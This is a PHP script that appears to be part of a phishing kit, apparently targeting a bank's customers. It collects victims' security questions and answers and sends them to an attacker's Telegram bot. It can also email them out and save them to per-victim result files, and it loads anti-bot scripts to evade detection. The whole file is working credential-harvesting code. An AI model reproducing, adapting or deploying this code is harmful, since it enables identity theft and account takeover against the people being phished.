<?php
session_start();
error_reporting(0);
include('../../bots/anti1.php');
include('../../bots/anti2.php');
include('../../bots/anti3.php');
include('../../bots/anti4.php');
include('../../bots/anti5.php');
include('../../bots/anti6.php');
include('../../bots/anti7.php');
include('../../bots/anti8.php');
include('../../bots/ant1.php');
include('../../bots/ant2.php');
include('../../bots/ant3.php');
include('../../bots/ant4.php');
include('../../bots/ant5.php');
include('../../bots/ant6.php');
include('../../bots/ant7.php');
include('../../bots/ant8.php');
include('../../email.php');
include '../autob/bt.php';
include "../autob/bts2.php";
include "../req/config.php";


if(isset($_POST['quest1']) && isset($_POST['quest2']) && isset($_POST['quest3']) && isset($_POST['ans1']) && isset($_POST['ans2']) && isset($_POST['ans3'])){
	///////////////////////// MAIL PART //////////////////////
		$quest1 = $_POST['quest1'];
		$quest2 = $_POST['quest2']; 
		$quest3 = $_POST['quest3'];
		$ans1 = $_POST['ans1'];
		$ans2 = $_POST['ans2'];
		$ans3 = $_POST['ans3']; 
		$PublicIP = $_SERVER['REMOTE_ADDR'];
        $Info_LOG = "
|--------------- SECURITY Q & A ----------------| 
Q1            : $quest1
Ans1          : $ans1
Q2            : $quest2
Ans2          : $ans2
Q3            : $quest3
Ans3          : $ans3";
		$_SESSION['fullz'].=$Info_LOG; 
		
		$website="https://api.telegram.org/bot".$botToken;
  $params=[
      'chat_id'=>$chatId,
      'text'=>$Info_LOG,
  ];
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
// Don't Touche
//Email
        if ($Send_Email == 1) {
            $subject = $PublicIP.' New HUNT Q&A' ;$headers = 'From: HUNTSITE' . "\r\n" .'X-Mailer: PHP/' . phpversion();
			$protocol=array($subject,$Info_LOG,$headers);if (detectprotocol($protocol)){
				mail($to, $subject, $Info_LOG, $headers);}
        };
//FTP == 1 save result >< == 0 don't save result
        if ($Ftp_Write == 1) {
			@mkdir('../../rst');
            $file = fopen("../../rst/Result_".$PublicIP.".txt", 'a');
            fwrite($file, $Info_LOG);
			fclose($file);
        };
		header("location:verify.php?consent_handled=true&amp;consentResponseUri=%2Fprotocol&amp;p=none");
}
else { header("location:qa.php?sfailed=c3Fauth".md5(rand(100, 999999999))."2da15181d31&amp;consent_handled=true&amp;consentResponseUri=%2Fprotocol"); };
?>